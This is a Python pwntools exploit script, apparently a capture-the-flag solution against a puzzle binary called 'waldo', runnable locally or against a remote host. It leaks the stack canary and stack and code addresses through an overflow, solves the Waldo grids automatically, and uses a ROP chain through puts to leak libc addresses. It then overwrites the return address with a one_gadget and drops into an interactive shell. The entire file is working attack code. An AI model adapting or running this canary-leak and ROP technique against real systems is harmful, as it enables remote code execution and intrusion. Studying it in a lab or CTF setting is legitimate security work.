from pwn import *
context.arch = "amd64"


# r = remote('waldo.420blaze.in', 420)
if len(sys.argv) > 1 and sys.argv[1] == 'remote':
    r = remote('waldo.420blaze.in', 420)
else:
    r = process("./waldo")
    if len(sys.argv) > 1 and sys.argv[1] == 'gdb':
        gdb.attach(r, """
              set disassembly-flavor intel
               b *(0x555555554000 + 0xe58)
               """)

r.recvuntil("Would you like to play? (y/N)")
r.sendline('y')

def find_waldo(grid):
  """grid is an array of strings"""
  for r, cur_row in enumerate(grid):
    for c, cur_char in enumerate(cur_row):
      if cur_char == 'W':
        return r, c

r.sendline('A' * 130)
r.sendline('y')
r.sendline('A' * 130)
r.sendline('y')

r.recvuntil('Where\'s Waldo?')
r.recvuntil('Where\'s Waldo?')
resp = r.recvuntil('Where\'s Waldo?')
print(resp)

resp = resp.replace('\n', '')

idx = resp.index('MMMMMMMA') + len('MMMMMMMA')
canary = u64(resp[idx:idx+8])
stack = u64(resp[idx+8:idx+16])
code = u64(resp[idx+16:idx+24])

stack_base = 0x7fffffffd0b0
code_base = 0x555555554c43

stack_offset = stack - stack_base
code_offset = code - code_base

print('canary: {}'.format(hex(canary)))
print('  code: {}'.format(hex(code)))
print(' stack: {}'.format(hex(stack)))

r.sendline('3 4')
r.recvuntil('(y/N)')
r.sendline('y')

for i in range(32):
  resp = r.recvuntil("Where's Waldo?")
  grid = resp.split('\n')[1 : -3]
  row, col = find_waldo(grid)
  r.sendline(str(row) + ' ' + str(col))
  r.recvline()
  print "Done with (0-indexed) " + str(i)


puts_arg1 = 0x7fffffffdfe8 + stack_offset # printf + 153
puts_arg2 = 0x7fffffffe0a8 + stack_offset # gets + 203
puts_addr = 0x555555554998 + code_offset
pop_rdi = 0x555555555113 + code_offset
main = 0x555555554ef2 + code_offset

chain1 = ''
chain1 += p64(pop_rdi)
chain1 += p64(puts_arg1)
chain1 += p64(puts_addr)
chain1 += p64(pop_rdi)
chain1 += p64(puts_arg2)
chain1 += p64(puts_addr)
chain1 += p64(main)

r.sendline('A' * 72 + p64(canary) + 'A' * 8 + chain1)
r.recvline()
r.recvline()
leak = r.recvline()
libc_leak1 = u64(leak.strip() + '\x00' + '\x00')
leak = r.recvline()
libc_leak2 = u64(leak.strip() + '\x00' + '\x00')
print('printf: {}'.format(hex(libc_leak1 - 153)))
print('  gets: {}'.format(hex(libc_leak2 - 206)))
libc_base = libc_leak1 - 153 - 0x55800
print("libc_base:", hex(libc_base))
one_gadget_offset = 0x4526a
one_gadget = libc_base + one_gadget_offset

r.recvuntil("Would you like to play? (y/N)")
r.sendline('y')

for i in range(32):
  resp = r.recvuntil("Where's Waldo?")
  grid = resp.split('\n')[1 : -3]
  row, col = find_waldo(grid)
  r.sendline(str(row) + ' ' + str(col))
  r.recvline()
  print "Done with (0-indexed) " + str(i)

chain2 = ''
chain2 += p64(one_gadget)
r.sendline('A' * 72 + p64(canary) + 'A' * 8 + chain2)

r.interactive()
